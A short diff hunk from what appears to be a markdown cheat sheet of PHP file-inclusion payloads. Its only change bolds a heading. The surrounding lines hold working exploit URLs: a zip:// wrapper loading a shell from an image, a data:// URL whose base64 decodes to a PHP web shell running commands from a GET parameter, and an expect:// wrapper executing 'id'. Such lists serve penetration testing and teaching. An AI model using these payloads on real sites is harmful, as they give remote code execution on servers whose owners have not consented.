@@ -165,7 +165,7 @@ http://example.com/index.php?page=zip://shell.jpg%23payload.php
 http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
 ```
 
-> RFI Wrapper EXPECT :
+> **RFI Wrapper EXPECT** :
 
 ```
 http://example.com/index.php?page=php:expect://id
